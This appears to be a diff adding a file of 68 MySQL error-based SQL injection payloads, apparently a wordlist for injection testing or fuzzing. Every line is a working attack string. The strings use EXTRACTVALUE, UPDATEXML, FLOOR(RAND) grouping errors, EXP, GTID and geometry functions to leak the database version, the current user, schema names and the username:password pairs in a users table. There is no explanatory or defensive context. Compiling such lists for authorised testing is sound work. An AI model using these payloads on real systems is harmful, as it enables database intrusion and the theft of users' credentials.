@@ -1,0 +1,68 @@
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND EXP(~(SELECT * FROM (SELECT @@version)x))--
+' AND EXP(~(SELECT * FROM (SELECT user())x))--
+' AND EXP(~(SELECT * FROM (SELECT database())x))--
+' AND EXP(~(SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)x))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT @@version),0x7e)) USING utf8)))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT user()),0x7e)) USING utf8)))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT database()),0x7e)) USING utf8)))--
+' AND GeometryCollection((SELECT * FROM (SELECT @@version)x))--
+' AND GeometryCollection((SELECT * FROM (SELECT user())x))--
+' AND GeometryCollection((SELECT * FROM (SELECT database())x))--
+' AND POLYGON((SELECT * FROM (SELECT @@version)x))--
+' AND MULTIPOINT((SELECT * FROM (SELECT @@version)x))--
+' AND MULTILINESTRING((SELECT * FROM (SELECT @@version)x))--
+' AND MULTIPOLYGON((SELECT * FROM (SELECT @@version)x))--
+' AND LINESTRING((SELECT * FROM (SELECT @@version)x))--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--
+' AND (SELECT * FROM (SELECT NAME_CONST((SELECT database()),1),NAME_CONST((SELECT database()),1))x)--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' UNION SELECT 1,2,3,4,5,UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(CHAR(58),CHAR(58),(SELECT user()),CHAR(58),CHAR(58),FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),CHAR(58),(SELECT user()),CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)--
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,user())),1)--
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,database())),1)--
+' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--
+' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
+' OR 1 GROUP BY CONCAT_WS(0x3a,USER(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
+' OR 1 GROUP BY CONCAT_WS(0x3a,DATABASE(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(version() AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(database() AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(user() AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(table_name AS CHAR),0x7e)) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(column_name AS CHAR),0x7e)) FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,0x3a,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT database()),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT version()),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x3a,0x3a,FLOOR(RAND(0)*2))a FROM information_schema.columns GROUP BY a)b)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7e,table_name,0x7e) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7e,column_name,0x7e) FROM information_schema.columns WHERE table_name='users' LIMIT 1,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7e,username,0x3a,password,0x7e) FROM users LIMIT 1,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
